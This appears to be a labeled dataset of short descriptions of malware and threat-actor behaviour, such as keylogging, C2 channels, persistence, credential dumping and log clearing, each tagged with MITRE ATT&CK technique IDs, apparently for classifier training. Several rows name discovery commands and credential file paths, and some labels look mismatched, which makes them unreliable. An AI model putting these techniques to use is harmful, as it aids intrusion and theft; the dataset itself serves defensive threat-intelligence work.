can timestomp files on victims using a Web shell.	['T1070.006']
can track key presses with a keylogger module.	['T1056']
can uninstall malware components using a batch script. Additionally, a malicious Word document used for delivery uses VBA macros for execution.	['T1064']
can upload, download, and execute files on the victim.	['T1105']
can upload and download files.	['T1105']
can upload and download files to the victim.	['T1105']
can upload and download to/from a victim machine.	['T1105']
can upload files from compromised hosts.	['T1005']
can upload files to the victim's machine for operations.	['T1105']
can upload files to the victim’s machine and can download additional payloads.	['T1105']
can use a number of known techniques to bypass Windows UAC.	['T1548.002']
can use DCOM (targeting the 127.0.0.1 loopback address) to execute additional payloads on compromised hosts.	['T1021.003']
can use DDE to execute additional payloads on compromised hosts.	['T1559.002']
can use HTTP and DNS for C2 communications.	['T1071']
can use HTTP for C2.	['T1071']
can use HTTP or DNS for C2.	['T1071']
can use HTTP or HTTPS for command and control to hard-coded C2 servers.	['T1071']
can use HTTP or SMTP for C2.	['T1071']
can use known credentials to run commands and spawn processes as another user.	['T1078']
can use MS10-061 to exploit a print spooler vulnerability in a remote system with a shared printer in order to move laterally.	['T1210']
can use Mshta.exe to execute additional payloads on compromised hosts.	['T1218.005']
can use MSHTA to serve additional payloads.	['T1218.005']
can use Obfs3, a pluggable transport, to add another layer of encryption and obfuscate TLS.	['T1573']
can use port 995 for C2.	['T1571']
can use PowerSploit or other scripting frameworks to perform execution.	['T1064']
can use process hollowing for execution.	['T1055.012']
can user PowerView to perform “net user” commands and create local system and domain accounts.	['T1136']
can use Rundll32 to execute additional payloads.	['T1218.011']
can use SSL and TLS for communications.	['T1573']
can use tasklist to collect a list of running tasks.	['T1057']
can use the command-line utility cacls.exe to change file permissions.	['T1059', 'T1222']
can use the Windows API function CreateProcess to execute another process.	['T1106']
can use Window admin shares (C$ and ADMIN$) for lateral movement.	['T1021.002']
can use Windows Authentication Packages for persistence.	['T1547.002']
can use WinRM to execute a payload on a remote host.	['T1021.006']
can use WMI queries to gather system information.	['T1047']
can use WMI queries to retrieve data from compromised hosts.	['T1047']
can use WMI to execute commands.	['T1047']
can wipe drives using  Remove-Item commands.	['T1070.004']
can write and execute PowerShell scripts.	['T1059.001']
captured screenshots and desktop video recordings.	['T1113']
captured screenshots and sent them out to a C2 server.	['T1113']
captures and DES-encrypts credentials before writing the username and password to a log file, C:\log.txt.	['T1056']
captures hashes and credentials that are sent to the system after the name services have been poisoned.	['T1040']
captures keystrokes and sends them back to the C2 server.	['T1056']
captures screenshots based on specific keywords in the window’s title.	['T1113']
captures screenshots of the infected system.	['T1113']
captures screenshots of the victim’s screen.	['T1113']
captures the content of the desktop with the screencapture binary.	['T1113']
checks for anti-virus, forensics, and virtualization software.	['T1518.001']
checks for new hard drives on the victim, such as USB devices, by listening for the WM_DEVICECHANGE window message.	['T1120']
checks for processes associated with anti-virus vendors.	['T1518.001']
checks for sandboxing libraries and debugging tools.	['T1518.001']
checks for the existence of anti-virus.	['T1518.001']
checks for the presence of Bitdefender security software.	['T1518.001']
checks if a value exists within a Registry key in the HKCU hive whose name is the same as the scheduled task it has created.	['T1012']
checks if the victim OS is 32 or 64-bit.	['T1082']
checks its parent process for indications that it is running in a sandbox setup.	['T1057']
checks the Registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings for proxy configurations information.	['T1012']
checks the running processes for evidence it may be running in a sandbox environment. It specifically enumerates processes for Wireshark and Sysinternals.	['T1057']
cleared Windows event logs and other logs produced by tools they used, including system, security, terminal services, remote services, and audit logs. The actors also deleted specific Registry keys.	['T1070']
clears event logs.	['T1070']
clears the system event logs.	['T1070']
code may be obfuscated through structured exception handling and return-oriented programming.	['T1027']
collected complete contents of the 'Pictures' folder from compromised Windows systems.	['T1005']
collected data from local victim systems.	['T1005']
collected file listings of all default Windows directories.	['T1083']
collected system architecture information.  used an HTTP malware variant and a Port 22 malware variant to gather the hostname and CPU information from the victim’s machine.	['T1082']
collected the victim computer name, OS version, and architecture type and sent the information to its C2 server.  also enumerated all available drives on the victim's machine.	['T1082']
collected the victim username and whether it was running as admin, then sent the information to its C2 server.	['T1033']
collects, compresses, encrypts, and exfiltrates data to the C2 server every 10 minutes.	['T1029']
collects a list of active and listening connections by using the command netstat -nao as well as a list of available network mappings with net use.	['T1049']
"collects a list of files and directories in C:\ with the command dir /s /a c:\ >> ""C:\windows\TEMP\[RANDOM].tmp""."	['T1083']
collects a list of install programs and services on the system’s machine.	['T1007']
collects a list of network shares with the command net share.	['T1135']
collects a list of running services with the command tasklist /svc.	['T1007']
collects a unique identifier (UID) from a compromised host.	['T1082']
collects data from the clipboard.	['T1115']
collects data from the local victim system.	['T1005']
collects data stored in the clipboard.	['T1115']
collects endpoint information using the systeminfo command.	['T1082']
collects files with the following extensions: .ppt, .pptx, .pdf, .doc, .docx, .xls, .xlsx, .docm, .rtf, .inp, .xlsm, .csv, .odt, .pps, .vcf and sends them back to the C2 server.	['T1005']
collects general system enumeration data about the infected machine and checks the OS version.	['T1082']
collects hard drive content and system configuration information.	['T1082']
collects information about available drives, default browser, desktop file list, My Documents, Internet history, program files, and root of available drives. It also searches for ICS-related software files.	['T1083']
collects information about running processes.	['T1057']
collects information about running processes from victims.	['T1057']
collects information about the OS and computer name.	['T1082']
collects information from the victim, including installed drivers, programs previously executed by users, programs and services configured to automatically run at startup, files and folders present in any user's home folder, files and folders present in any user's My Documents, programs installed to the Program Files folder, and recently accessed files, folders, and programs.	['T1083']
collects information on network settings and Internet proxy settings from the victim.	['T1016']
collects information on running processes and environment variables from the victim.	['T1057']
collects its process identifier (PID) on the victim.	['T1057']
collects Keychain storage data and copies those passwords/tokens to a file.	['T1555.001']
collects keystrokes from the victim machine.	['T1056']
collects keystrokes from the victim’s machine.	['T1056']
collects local files and information from the victim’s local machine.	['T1005']
collects MAC address and local IP address information from the victim.	['T1016']
collects network adapter and interface information by using the commands ipconfig /all, arp -a and route print. It also collects the system's MAC address with getmac and domain configuration with net config workstation.	['T1016']
collects OS version information such as registered owner details, manufacturer details, processor type, available storage, installed patches, hostname, version info, system date, and other system information by using the commands systeminfo, net config workstation, hostname, ver, set, and date /t.	['T1082']
collects password policy information with the command net accounts.	['T1201']
collects system information from the victim, including CPU speed, computer name, volume serial number, ANSI code page, OEM code page identifier for the OS, Microsoft Windows version, and memory information.	['T1082']
collects the account name of the logged-in user and sends it to the C2.	['T1033']
collects the computer name, OS versioning information, and OS install date and sends the information to the C2.	['T1082']
collects the computer name, the BIOS model, and execution path.	['T1082']
collects the computer name and host name on the compromised system.	['T1082']
collects the computer name and serial number for the storage volume C:\.	['T1082']
collects the current username and sends it to the C2 server.	['T1033']
collects the current username from the victim.	['T1033']
collects the domain name from a compromised host.	['T1016']
collects the endpoint victim's username and uses it as a basis for downloading additional components from the C2 server.	['T1033']
collects the group name of the logged-in user and sends it to the C2.	['T1069']
collects the hostname of the victim machine.	['T1082']
collects the keychains on the system.	['T1555.001']
collects the local IP address of the victim and sends it to the C2.	['T1016']
collects the MAC address, computer name, and CPU information.	['T1082']
collects the network adapter’s IP and MAC address as well as IP addresses of the network adapter’s default gateway, primary/secondary WINS, DHCP, and DNS servers, and saves them into a log file.	['T1016']
collects the OS name, machine name, and architecture information.	['T1082']
collects the OS version, country name, MAC address, computer name, physical memory statistics, and volume information for all drives on the system.	['T1082']
collects the OS version and computer name.	['T1082']
collects the system information, including hostname and OS version, and sends it to the C2 server.	['T1082']
collects the system name, OS version including service pack, and system install date and sends the information to the C2 server.	['T1082']
collects the username from the victim’s machine.	['T1033']
collects the users of the system.	['T1087']
collects the victim's IP address.	['T1016']
collects the victim's username.	['T1033']
collects the victim IP address, MAC address, as well as the victim account domain name.	['T1016']
collects the victim LAN IP address and sends it to the C2 server.	['T1016']
collects the victim’s computer name, processor architecture, OS version, and volume serial number.	['T1082']
collects the victim’s username and whether that user is an admin.	['T1033']
collects the volumes mapped on the system, and also steals files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, and .pdf.	['T1083']
collects user files from the compromised host based on predefined file extensions.	['T1005']
collects various information via WMI requests, including CPU information in the Win32_Processor entry (Processor ID, Name, Manufacturer and the clock speed).	['T1047']
command and control occurs via HTTPS over port 443.	['T1043', 'T1071']
Commands such as net group and net localgroup can be used in  to gather information about and manipulate groups.	['T1069']
Commands such as net view can be used in  to gather information about available remote systems.	['T1018']
Commands under net user can be used in  to gather information about and manipulate user accounts.	['T1087']
commonly created Web shells on victims' publicly accessible email and web servers, which they used to maintain access to a victim network and download additional malicious files.	['T1505.003']
communicates over common ports such as TCP 80, 443, and 25.	['T1043']
communicates over HTTP for C2.	['T1071']
communicates over HTTP or HTTPS for C2.	['T1071']
communicates over ports 80, 443, 53, and 8080 via raw sockets instead of the protocols usually associated with the ports.	['T1043']
communicates to its C2 server over HTTP.	['T1071']
communicates to its C2 server over HTTP and embeds data within the Cookie HTTP header.	['T1071']
communicates to the C2 server by retrieving a Google Doc.	['T1102']
communicates using HTTPS and uses a custom encryption cipher to encrypt the HTTPS message body.	['T1573']
communicates via DNS for C2.	['T1071']
communicates via ICMP for C2.	['T1095']
communicates with its C2 server over HTTP.	['T1071']
communicates with its C2 server over HTTPS.	['T1071']
communicates with its C2 server over TCP port 3728.	['T1571']
communicates with its C2 servers over HTTP.	['T1071']
communicates with its C2 servers through a TCP socket.	['T1095']
completes network communication via raw sockets.	['T1095']
compressed data with zlib prior to sending it over C2.	['T1560']
compresses collected files with both the GZipStream class and a simple character replacement scheme before sending them to its C2 server.	['T1560']
compresses output data generated by command execution with a custom implementation of the Lempel–Ziv–Welch (LZW) algorithm.	['T1560']
compromised legitimate organizations' websites to create watering holes to compromise victims.	['T1189']
compromised McAfee ePO to move laterally by distributing malware as a software deployment task.	['T1072']
compromised three Japanese websites using a Flash exploit to perform watering hole attacks.	['T1189']
compromised user credentials and used valid accounts for operations.	['T1078']
concatenates then decompresses multiple resources to load an embedded .Net Framework assembly.	['T1140']
conducts brute force attacks against SSH services to gain initial access.	['T1110']
conducts credential dumping on victims, with a focus on obtaining credentials belonging to domain and database servers.	['T1003']
configured its payload to inject into the rundll32.exe.	['T1218.011']
configures itself as a service.	['T1543.003']
connects over 443 for C2.	['T1043']
connects to a predefined domain on port 443 to exfil gathered information.	['T1048']
connects to C2 infrastructure and establishes backdoors over a custom communications protocol.	['T1095']
connects to external C2 infrastructure over the HTTP port.	['T1043']
connects to port 80 of a C2 server using Wininet API.	['T1071']
contains a .NET wrapper DLL for creating and managing scheduled tasks for maintaining persistence upon reboot.	['T1053.005']
contains a cleanup module that removes traces of itself from the victim.	['T1070.004']
contains a collection of CodeExecution modules that enable by injecting code (DLL, shellcode) or reflectively loading a Windows PE file into a process.	['T1055']
contains a collection of Exfiltration modules that can access data from local files, volumes, and processes.	['T1005']
contains a collection of Exfiltration modules that can harvest credentials from Group Policy Preferences, Windows vault credential objects, or using .	['T1003']
contains a collection of Privesc-PowerUp modules that can discover and exploit DLL hijacking opportunities in services and processes.	['T1574.001']
contains a collection of Privesc-PowerUp modules that can discover and exploit various path interception opportunities in services, processes, and variables.	['T1034']
contains a collection of Privesc-PowerUp modules that can discover and replace/modify service binaries, paths, and configs.	['T1543.003']
contains a collection of Privesc-PowerUp modules that can query Registry keys for potential opportunities.	['T1012']
contains a command to collect and exfiltrate emails from Outlook.	['T1114']
contains a command to collect information about anti-virus software on the victim.	['T1518.001']
contains a command to collect the victim MAC address and LAN IP.	['T1016']
contains a command to collect the victim PC name and operating system.	['T1082']
contains a command to download and execute a file from a remotely hosted URL using WinINet HTTP requests.	['T1105']
contains a command to perform screen captures.	['T1113']
contains a command to retrieve files from its C2 server.	['T1105']
contains a copy of the OpenSSL library to encrypt C2 traffic.	['T1573']
contains a custom version of the RC4 algorithm that includes a programming error.	['T1573']
contains a keylogger component.	['T1056']
contains a keylogger module.	['T1056']
contains a keylogger module that collects keystrokes and the titles of foreground windows.	['T1056']
contains a module that captures screenshots of the victim's desktop.	['T1113']
contains a module that collects documents with certain extensions from removable media or fixed drives connected via USB.	['T1025']
contains a module to steal credentials from Web browsers on the victim machine.	['T1003']
contains base64-encoded strings.	['T1027']
contains code to clear event logs.	['T1070']
contains code to delete files from the victim’s machine.	['T1070.004']
contains code to open and copy data from the clipboard.	['T1115']
contains commands to list files and directories, as well as search for files matching certain extensions from a defined list.	['T1083']
contains functionality to collect information from the clipboard.	['T1115']
contains junk code in its binary, likely to confuse malware analysts.	['T1027.001']
contains junk code in its functions in an effort to confuse disassembly programs.	['T1027.001']
contains keylogger functionality.	['T1056']
contains keylogging functionality that will monitor for active application windows and write them to the log, it can handle special characters, and it will buffer by default 50 characters before sending them out over the C2 infrastructure.	['T1056']
contains keylogging functionality to steal passwords.	['T1056']
contains many methods for bypassing Windows User Account Control on multiple versions of the operating system.	['T1548.002']
contains modules to infect USB sticks and spread laterally to other Windows systems the stick is plugged into using autorun functionality.	['T1091']
contains screen capture functionality.	['T1113']
contains the execFile function to execute a specified file on the system using the NSTask:launch method.	['T1106']
contains the ftpUpload function to use the FTPManager:uploadFile method to upload files from the target system.	['T1071']
contains the getFirefoxPassword function to attempt to locate Firefox passwords.	['T1552.001']
contains the getInfoOSX function to return the OS X version as well as the current user.	['T1033']
contains the getInstalledAPP function to run ls -la /Applications to gather what applications are installed.	['T1082']
contains the readFiles function to return a detailed listing (sometimes recursive) of a specified directory.	['T1083']
contains the showBackupIosFolder function to check for IOS device backups by running ls -la ~/Library/Application\ Support/MobileSync/Backup/.	['T1120']
contains the takeScreenShot (along with startTakeScreenShot and stopTakeScreenShot) functions to take screenshots using the CGGetActiveDisplayList, CGDisplayCreateImage, and NSImage:initWithCGImage methods.	['T1113']
contains UAC bypass code for both 32- and 64-bit systems.	['T1548.002']
contains unused machine instructions in a likely attempt to hinder analysis.	['T1027.001']
copied all targeted files to a directory called index that was eventually uploaded to the C&C server.	['T1074']
copied and installed tools for operations once in the victim environment.	['T1105']
copies a file over to the remote system before execution.	['T1105']
copies an executable payload to the target system by using  and then scheduling an unnamed task to execute the malware.	['T1053.005']
copies documents under 15MB found on the victim system to is the user's %temp%\SMB\ folder. It also copies files from USB devices to a predefined directory.	['T1074']
copies files from removable drives to C:\system.	['T1074']
copies itself into the public folder of Network Attached Storage (NAS) devices and infects new victims who open the file.	['T1080']
copies itself to an .exe file with a filename that is likely intended to imitate Norton Antivirus but has several letters reversed (e.g. notron.exe).	['T1036']
copies itself to disk and creates an associated run key Registry entry to establish.	['T1547.001']
copies itself to the Startup folder to establish persistence.	['T1547.001']
copies staged data to removable drives when they are inserted into the system.	['T1052']
created accounts disguised as legitimate backup and service accounts as well as an email administration account.	['T1036']
created a custom video recording capability that could be used to monitor operations in the victim's environment.	['T1125']
"created a directory named ""out"" in the user's %AppData% folder and copied files to it."	['T1074']
created a shortcut in the Windows startup folder to launch a PowerShell script each time the user logs in to establish persistence.	['T1547.001']
created a  that used regsvr32.exe to execute a COM scriptlet that dynamically downloaded a backdoor and injected it into memory.	['T1218.010']
created new Windows services and added them to the startup directories for persistence.	['T1543.003']
creates a backdoor by making a connection using a HTTP POST.	['T1071']
creates a backdoor through which remote attackers can adjust token privileges.	['T1134']
creates a backdoor through which remote attackers can change the frequency at which compromised hosts contact remote C2 infrastructure.	['T1029']
creates a backdoor through which remote attackers can create a service.	['T1543.003']
creates a backdoor through which remote attackers can delete files.	['T1070.004']
creates a backdoor through which remote attackers can download files and additional malware components.	['T1105']
creates a backdoor through which remote attackers can download files onto a compromised host.	['T1105']
creates a backdoor through which remote attackers can download files onto compromised hosts.	['T1105']
creates a backdoor through which remote attackers can inject files into running processes.	['T1055']
creates a backdoor through which remote attackers can load and call DLL functions.	['T1129']
creates a backdoor through which remote attackers can monitor services.	['T1007']
creates a backdoor through which remote attackers can obtain data from local systems.	['T1005']
creates a backdoor through which remote attackers can retrieve a list of running processes.	['T1057']
creates a backdoor through which remote attackers can retrieve files.	['T1005']
creates a backdoor through which remote attackers can retrieve information such as hostname and free disk space.	['T1082']
creates a backdoor through which remote attackers can retrieve IP addresses of compromised machines.	['T1016']
creates a backdoor through which remote attackers can retrieve lists of files.	['T1083']
creates a backdoor through which remote attackers can retrieve lists of running processes.	['T1057']
creates a backdoor through which remote attackers can retrieve system information, such as CPU speed, from Registry keys.	['T1012']
creates a backdoor through which remote attackers can start a remote shell.	['T1059']
creates a directory, %USERPROFILE%\AppData\Local\SKC\, which is used to store collected log files.	['T1074']
creates a Launch Agent on macOS.	['T1543.001']
creates and uses a VBScript as part of its persistent execution.	['T1064']
creates a new service named “ntssrv” that attempts to appear legitimate; the service's display name is “Microsoft Network Realtime Inspection Service” and its description is “Helps guard against time change attempts targeting known and newly discovered vulnerabilities in network time protocols.”	['T1036']
creates a new service named “ntssrv” to execute the payload.	['T1569.002', 'T1543.003']
creates a new service that loads a malicious driver when the system starts. When Duqu is active, the operating system believes that the driver is legitimate, as it has been signed with a valid private key.	['T1543.003']
creates a new thread implementing a keylogging facility using Windows Keyboard Accelerators.	['T1056']
creates a new Windows service with the malicious executable for persistence.	['T1543.003']
creates a Registry key to ensure a file gets executed upon reboot in order to establish persistence.	['T1547.001']
creates a Registry Run key to establish persistence.	['T1547.001']
creates a Registry subkey that registers a new service.	['T1543.003', 'T1112']
creates a Registry subkey to register its created service, and can also uninstall itself later by deleting this value. 's backdoor also enables remote attackers to modify and delete subkeys.	['T1112']
creates a scheduled task to establish by executing a malicious payload every subsequent minute.	['T1053.005']
creates a scheduled task to maintain persistence on the victim’s machine.	['T1053.005']
creates a scheduled task to run itself every three minutes.	['T1053.005']
creates a shortcut file and saves it in a Startup folder to establish persistence.	['T1547.009', 'T1547.001']
creates a suspended svchost process and injects its DLL into it.	['T1055']
creates a Windows service to establish persistence.	['T1543.003']
creates folders to store output from batch scripts prior to sending the information to its C2 server.	['T1074']
creates new services to establish persistence.	['T1543.003']
creates processes using the Windows API calls: CreateProcessA() and CreateProcessAsUserA().	['T1106']
creates Registry entries that store information about a created service and point to a malicious DLL dropped to disk.	['T1112']
creates Registry keys to allow itself to run as various services.	['T1543.003']
creates run key Registry entries pointing to malicious DLLs dropped to disk.	['T1547.001']
creates scheduled tasks to establish persistence.	['T1053.005']
creates the following Registry entry: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Micromedia.	['T1547.001']
creates then deletes log files during installation of itself as a service.	['T1070.004']
creates valid users to provide access to the system.	['T1078']
creates various subdirectories under %Temp%\reports\% and copies files to those subdirectories. It also creates a folder at C:\Users\<Username>\AppData\Roaming\Microsoft\store to store screenshot JPEG files.	['T1074']
credential stealer ZUMKONG emails credentials from the victim using HTTP POST requests.	['T1095']
"Data captured by  is placed in a temporary file under a directory named ""memdump""."	['T1074']
Data  copies to the staging area is compressed with zlib. Bytes are rotated by four positions and XOR'ed with 0x23.	['T1486']
decodes an embedded configuration using XOR.	['T1140']
decodes Base64 strings and decrypts strings using a custom XOR algorithm.	['T1140']
decodes embedded XOR strings.	['T1140']
decodes strings in the malware using XOR and RC4.	['T1140']
decrypts and extracts a copy of its main DLL payload when executing.	['T1140']
decrypts code, strings, and commands to use once it's on the victim's machine.	['T1140']
decrypts resources needed for targeting the victim.	['T1140']
deleted many of its files used during operations as part of cleanup, including removing applications and deleting screenshots.	['T1070.004']
deleted the DLL dropper from the victim’s machine to cover their tracks.	['T1070.004']
deletes content from C2 communications that was saved to the user's temporary directory.	['T1070.004']
deletes data in a way that makes it unrecoverable.	['T1070.004']
deletes files using DeleteFileW API call.	['T1070.004']
deletes one of its files, 2.hwp, from the endpoint after establishing persistence.	['T1070.004']
deletes shadow copies from the victim.	['T1070.004']
deletes the original dropped file from the victim.	['T1070.004']
deletes the Registry key HKCU\Software\Classes\Applications\rundll32.exe\shell\open.	['T1112']
delivered  to victims via a compromised legitimate website.	['T1189']
deobfuscates its strings and APIs once its executed.	['T1140']
DES-encrypts captured credentials using the key 12345678 before writing the credentials to a log file.	['T1486']
determines a working directory where it stores all the gathered data about the compromised machine.	['T1074']
digitally signed an executable with a stolen certificate from legitimate company AI Squared.	['T1553.002']
discovers information about the infected machine.	['T1082']
discovers shares on the network	['T1135']
discovers the current domain information.	['T1016']
disguised its malicious binaries with several layers of obfuscation, including encrypting the files.	['T1027']
DLL file and non-malicious decoy file are encrypted with RC4.	['T1027']
DLL side-loading has been used to execute  through a legitimate Citrix executable ssonsvr.exe which is vulnerable to the technique. The Citrix executable was dropped along with  by the dropper.	['T1574.002']
downloaded and launched code within a SCT file.	['T1064']
"downloader code has included ""0"" characters at the end of the file to inflate the file size in a likely attempt to evade anti-virus detection."	['T1027.001']
downloads additional files from C2 servers.	['T1105']
downloads additional files that are base64-encoded and encrypted with another cipher.	['T1027']
downloads additional payloads.	['T1105']
downloads and executes additional malware from either a Web address or a Microsoft OneDrive account.	['T1105']
downloads and executes additional PowerShell code and Windows binaries.	['T1105']
downloads and executes PowerShell scripts.	['T1059.001']
downloads and installs Tor via homebrew.	['T1090.003']
downloads and uploads files on the victim’s machine.	['T1105']
downloads a new version of itself once it has installed. It also downloads additional plugins.	['T1105']
downloads an executable and injects it directly into a new process.	['T1055']
downloads a PowerShell script that decodes to a typical shellcode loader.	['T1059.001']
downloads encoded payloads and decodes them on the victim.	['T1140']
downloads files onto infected hosts.	['T1105']
downloads several additional files and saves them to the victim's machine.	['T1105']
dropped and executed SecretsDump and CrackMapExec, tools that can dump password hashes.	['T1003']
dropped and executed tools used for password cracking, including Hydra.	['T1110']
dropper creates VBS scripts on the victim’s machine.	['T1064']
Droppers used by  use RC4 or a 16-byte XOR key consisting of the bytes 0xA0 – 0xAF to obfuscate payloads.	['T1027']
drops a signed Microsoft DLL to disk.	['T1553.002']
drops a Word file containing a Base64-encoded file in it that is read, decoded, and dropped to the disk by the macro.	['T1140']
drops commands for a second victim onto a removable media drive inserted into the first victim, and commands are executed when the drive is inserted into the second victim.	['T1092']
dumped the login data database from \AppData\Local\Google\Chrome\User Data\Default\Login Data.	['T1003']
dumps memory from specific processes on a victim system, parses the dumped files, and scrapes them for credit card data.	['T1005']
dumps usernames and passwords from Firefox, Internet Explorer, and Outlook.	['T1003']
During execution,  malware deobfuscates and decompresses code that was encoded with Metasploit’s shikata_ga_nai encoder as well as compressed with LZNT1 compression.	['T1140']
During its initial execution,  extracts operating system information from the infected host.	['T1082']
During the  installation process, it drops a copy of the legitimate Microsoft binary igfxtray.exe. The executable contains a side-loading weakness which is used to load a portion of the malware.	['T1574.002']
Each time a new drive is inserted,  generates a list of all files on the drive and stores it in an encrypted file.	['T1119']
embedded a malicious macro in a Word document and lured the victim to click on an icon to execute the malware.	['T1204']
embeds a Visual Basic script within a malicious Word document as part of initial access; the script is executed when the Word document is opened. The actors also used batch scripting.	['T1064']
employs the same encoding scheme as  for data it stages. Data is compressed with zlib, and bytes are rotated four times before being XOR'ed with 0x23.	['T1486']
enables remote interaction and can obtain additional code over HTTPS GET and POST requests.	['T1071']
enables the Remote Desktop Protocol for persistence.	['T1021.001']
encapsulates traffic in multiple layers of encryption.	['T1573']
encoded C2 traffic with base64.	['T1132']
encodes C2 beacons using XOR.	['T1573']
encodes C2 traffic with base64.	['T1132']
encodes C2 traffic with Base64.	['T1132']
encodes commands from the control server using a range of characters and gzip.	['T1132']
encodes communications to the C2 server in Base64.	['T1132']
encodes files before exfiltration.	['T1132']
encodes files in Base64.	['T1027']
encrypted a .dll payload using RTL and a custom encryption algorithm.  has also obfuscated payloads with base64, XOR, and RC4.	['T1027']
encrypts C2 communications with RC4 as well as TLS.	['T1573']
encrypts C2 content with XOR using a single byte, 0x12.	['T1573']
encrypts C2 traffic using AES with a static key.	['T1573']
encrypts C2 traffic using an RC4 key.	['T1573']
encrypts C2 traffic using RC4 with a static key.	['T1573']
encrypts C2 traffic with AES and RSA.	['T1573']
encrypts C2 traffic with HTTPS and also encodes it with a single-byte XOR key.	['T1573']
encrypts collected data using a single byte XOR key.	['T1486']
encrypts command and control communications with RC4.	['T1573']
encrypts data sent to its C2 server over HTTP with RC4.	['T1573']
encrypts exfiltrated data with RC4.	['T1573']
encrypts several of its files, including configuration files.	['T1027']
encrypts some C2 traffic with the Blowfish cipher.	['T1573']
encrypts some of its files with XOR.	['T1027']
encrypts strings in the backdoor using a custom XOR algorithm.	['T1027']
encrypts strings to make analysis more difficult.	['T1027']
encrypts the collected files using 3-DES.	['T1486']
encrypts the message body of HTTP traffic with RC2 (in CBC mode) and Base64 encoding.	['T1573']
encrypts with the 3DES algorithm and a hardcoded key prior to exfiltration.	['T1486']
enumerates directories and obtains file attributes on a system.	['T1083']
enumerates directories and scans for certain files.	['T1083']
enumerates local and domain users	['T1087']
enumerates the current network connections similar to  net use .	['T1049']
established persistence by adding a Shell value under the Registry key HKCU\Software\Microsoft\Windows NT\CurrentVersion]Winlogon.	['T1547.004']
establishes by infecting the Security Accounts Manager (SAM) DLL to load a malicious DLL dropped to disk.	['T1547.008']
"establishes persistence by adding a new service with the display name ""WMI Performance Adapter Extension"" in an attempt to masquerade as a legitimate WMI service."	['T1036']
establishes persistence by adding a Registry Run key.	['T1547.001']
establishes persistence by creating a shortcut.	['T1547.009']
establishes persistence by creating a shortcut in the Windows startup folder to run a script each time the user logs in.	['T1547.009']
establishes persistence by creating the Registry key HKCU\Software\Microsoft\Windows\Run.	['T1547.001']
establishes persistence by installing a new service pointing to its DLL and setting the service to auto-start.	['T1543.003']
establishes persistence in the Startup folder.	['T1547.001']
establishes persistence through a Registry Run key.	['T1547.001']
establishes persistence under the Registry key HKCU\Software\Run auto_update.	['T1547.001']
examines running system processes for tokens that have specific system privileges. If it finds one, it will copy the token and store it for later use. Eventually it will start new processes with the stored token attached. It can also steal tokens to acquire administrative privileges.	['T1134']
executes a batch script to store discovery information in %TEMP%\info.dat and then uploads the temporarily file to the remote C2 server.	['T1119']
"executes a binary on the system and logs the results into a temp file by using: cmd.exe /c ""<file_path> > %temp%\PM* .tmp 2>&1""."	['T1059']
executes additional Jscript and VBScript code on the victim's machine.	['T1064']
executes and stores obfuscated Perl scripts.	['T1027']
executes BAT and VBS scripts.	['T1064']
executes cmd.exe and uses a pipe to read the results and send back the output to the C2 server.	['T1059']
executes cmd.exe to provide a reverse shell to adversaries.	['T1059']
executes commands remotely on the infected host.	['T1059']
executes commands remotely via cmd.exe.	['T1059']
executes commands using a command-line interface and reverse shell. The group has used a modified version of pentesting script wmiexec.vbs to execute commands.	['T1059']
executes functions using rundll32.exe.	['T1218.011']
executes ipconfig /all after initial communication is made to the remote server.	['T1016']
executes net start after initial communication is made to the remote server.	['T1007']
executes net user after initial communication is made to the remote server.	['T1087']
executes payloads using the Windows API call CreateProcessW().	['T1106']
executes shellcode and a script to decode Base64 strings.	['T1064']
executes systeminfo after initial communication is made to the remote server.	['T1082']
executes the netstat -ano command.	['T1049']
executes  using PowerShell and can also perform pass-the-ticket and use Lazagne for harvesting credentials.	['T1003']
executes using regsvr32.exe called from the  persistence mechanism.	['T1218.010']
exfiltrates collected files over FTP or WebDAV. Exfiltration servers can be separately configured from C2 servers.	['T1048']
exfiltrates command output and collected files to its C2 server in 1500-byte blocks.	['T1030']
exfiltrates data by uploading it to accounts created by the actors on Web cloud storage providers for the adversaries to retrieve later.	['T1048']
exfiltrates data in compressed chunks if a message is larger than 4096 bytes .	['T1030']
exfiltrates data over the same channel used for C2.	['T1041']
exfiltrates data using cookie values that are Base64-encoded.	['T1132']
exfiltrates screenshot files to its C2 server.	['T1041']
extracts and decrypts stage 3 malware, which is stored in encrypted resources.	['T1140']
Find-AVSignature AntivirusBypass module can be used to locate single byte anti-virus signatures.	['T1027.005']
finds a specified directory, lists the files and metadata about those files.	['T1083']
first attempts to use a Base64-encoded network protocol over a raw TCP socket for C2, and if that method fails, falls back to a secondary HTTP-based protocol to communicate to an alternate C2 server.	['T1008']
first stage shellcode contains a NOP sled with alternative instructions that was likely designed to bypass antivirus tools.	['T1027']
Following data collection,  has compressed log files into a ZIP archive prior to staging and exfiltration.	['T1560']
Following exploitation with  malware,  actors created a file containing a list of commands to be executed on the compromised computer.	['T1059']
For all non-removable drives on a victim,  executes automated collection of certain files for later exfiltration.	['T1119']
For early  versions, the compilation timestamp was faked.	['T1070.006']
gains persistence by adding the Registry key HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce.	['T1547.001']
gathered information and files from local directories for exfiltration.	['T1005']
gathers and beacons the operating system build number and CPU Architecture (32-bit/64-bit) during installation.	['T1082']
gathers and beacons the system time during installation.	['T1124']
gathers and beacons the username of the logged in account during installation. It will also gather the username of running processes to determine if it is running as SYSTEM.	['T1033']
gathers BIOS versions and manufacturers, the number of CPU cores, the total physical memory, and the computer name.	['T1082']
gathers computer names, OS version info, and also checks installed keyboard layouts to estimate if it has been launched from a certain list of countries.	['T1082']
gathers domain and account names/information through process monitoring.	['T1087']
gathers file and directory information from the victim’s machine.	['T1083']
gathers information about local groups and members.	['T1069']
gathers information about network adapters.	['T1016']
gathers information about opened windows.	['T1010']
gathers information about the Registry.	['T1012']
gathers information on local groups and members on the victim’s machine.	['T1087']
gathers information on users.	['T1033']
gathers product names from the Registry key: HKLM\Software\Microsoft\Windows NT\CurrentVersion ProductName and the processor description from the Registry key HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0 ProcessorNameString.	['T1012']
gathers system configuration information.	['T1082']
gathers system information, network addresses, disk type, disk free space, and the operation system version.	['T1082']
gathers the computer name, the serial number of the main disk volume, CPU information, Microsoft Windows version, and runs the command systeminfo.	['T1082']
gathers the computer name and checks the OS version to ensure it doesn’t run on a Windows XP or Windows Server 2003 systems.	['T1082']
gathers the current domain the victim system belongs to.	['T1016']
gathers the IP address and domain from the victim’s machine.	['T1016']
gathers the local system time from the victim’s machine.	['T1124']
